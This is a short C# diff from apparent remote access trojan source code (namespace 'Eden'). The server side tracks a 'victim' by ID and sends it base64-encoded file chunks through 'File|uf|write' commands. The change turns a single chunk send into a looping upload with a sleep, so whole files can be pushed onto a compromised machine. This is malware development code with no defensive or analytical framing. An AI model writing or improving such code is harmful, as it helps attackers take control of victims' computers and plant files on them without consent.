@@ -45,7 +45,7 @@ namespace Eden
             m_transferType = transferType;
         }
 
-        void fnSrvRecv(clsClient clnt, string szVictimID, string[] aszMsg)
+        void fnSrvRecv(clsClient clnt, string szVictimID, List<string> aszMsg)
         {
             if (szVictimID != m_victim.m_szID)
                 return;
@@ -211,12 +211,14 @@ namespace Eden
 
                 try
                 {
-                    (nRead, nIndex, abBuffer) = handler.fnabGetChunk();
-                    if (nRead == 0)
-                        return;
-
-                    m_victim.fnSendCommand(string.Join("|", new string[]
+                    while (true)
                     {
+                        (nRead, nIndex, abBuffer) = handler.fnabGetChunk();
+                        if (nRead == 0)
+                            return;
+
+                        m_victim.fnSendCommand(string.Join("|", new string[]
+                        {
                         "File",
                         "uf",
                         "write",
@@ -225,7 +227,10 @@ namespace Eden
                         m_nChunkSize.ToString(),
                         "0",
                         EZCrypto.Encoder.stre2b64(Convert.ToBase64String(abBuffer)),
-                    }), false);
+                        }), false);
+
+                        Thread.Sleep(100);
+                    }
                 }
                 catch (Exception ex)
                 {
